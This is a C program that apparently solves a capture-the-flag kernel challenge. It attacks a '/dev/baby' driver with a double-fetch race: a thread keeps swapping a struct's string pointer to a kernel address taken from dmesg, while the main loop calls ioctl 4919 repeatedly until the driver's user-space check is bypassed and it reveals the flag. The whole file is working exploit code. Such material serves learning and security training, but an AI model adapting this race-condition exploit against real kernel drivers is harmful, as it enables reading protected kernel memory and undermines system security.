#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#define try_time 0x1000

char s[] = "flag{AAAA_BBBB_CC_DDDD_EEEE_FFFF}";
char *flag_addr = NULL;
int finish = 0;

struct Flag{
    char *flag_str;
    unsigned long flag_len;
};


void *thread_run(void *tt){
    struct Flag *flag = tt;

    while(!finish){
        flag->flag_str = flag_addr;    
    }
}

int main(){

    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);

    int fd = open("/dev/baby",0);

    struct Flag *flag = (struct Flag *)malloc(sizeof(struct Flag));

    flag->flag_str = s;
    flag->flag_len = 0x21;

    ioctl(fd,0x6666);

    system("dmesg | grep \"Your flag is at \"");
    printf("input the flag addr :");
    scanf("%x",&flag_addr);
    
    pthread_t t1;
    pthread_create(&t1,NULL,thread_run,flag);
    
    for(int i=0;i<try_time;i++){
        int ret = ioctl(fd,4919,flag);
        if(ret != 0){
            printf("the flag addr:%p",flag->flag_str);
        }
        else{
            goto end;
        }
        flag->flag_str = s;
    }
    
end :
    finish = 1;

    pthread_join(t1,NULL);
    //ioctl(fd,4919,&flag);
    system("dmesg | grep \"the flag is not a secret anymore.\"");
    close(fd);    
    return 0;
}
